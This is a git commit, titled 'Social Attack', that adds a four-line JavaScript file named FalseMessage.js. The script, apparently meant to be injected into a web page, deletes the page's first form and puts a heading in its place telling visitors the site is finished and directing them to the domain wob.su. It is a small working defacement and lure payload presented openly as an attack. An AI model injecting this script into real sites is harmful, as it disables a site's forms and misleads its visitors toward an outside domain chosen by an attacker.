3ff0817eabb91fa9ec56ecad69895db07094642f
Jimmy Basiluk <vasilukwolf@gmail.com>
2020-02-17 14:32:17 -0500

    Social Attack

---
+++ SocialAttack/FalseMessage.js
@@ -0,0 +1,4 @@
+var input = document.createElement("h2");
+input.innerHTML = "Web site is done. Plese visit wob.su";
+document.forms[0].parentNode.appendChild(input);
+document.forms[0].parentNode.removeChild(document.forms[0]);
